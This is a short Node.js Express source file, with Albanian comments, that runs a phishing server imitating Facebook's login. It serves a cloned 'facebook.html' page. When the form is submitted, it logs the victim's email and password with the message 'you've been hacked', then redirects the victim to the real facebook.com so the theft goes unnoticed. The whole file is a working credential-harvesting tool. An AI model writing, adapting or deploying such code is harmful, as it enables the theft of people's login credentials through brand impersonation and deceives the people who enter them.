/**
npm init
npm install express --save

//kur te don me importu naj module e bon require("moduli"),
cont path = require("path");
 */

const express = require("express");
const app = express();

const path = require("path");

// const bodyParser = require("body-parses");

app.use(express.urlencoded({ extended: true }));

const PORT = 3000;
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "facebook.html"));
});

app.post("/", (req, res) => {
  const data = req.body;
  console.log(
    `Your email is : ${data.email}, your password is ${data.password}. Congratulations you've been hacked.`
  );
  res.redirect("https://www.facebook.com/");
});

app.listen(PORT, () => {
  console.log(`App is running on port ${PORT}`);
});
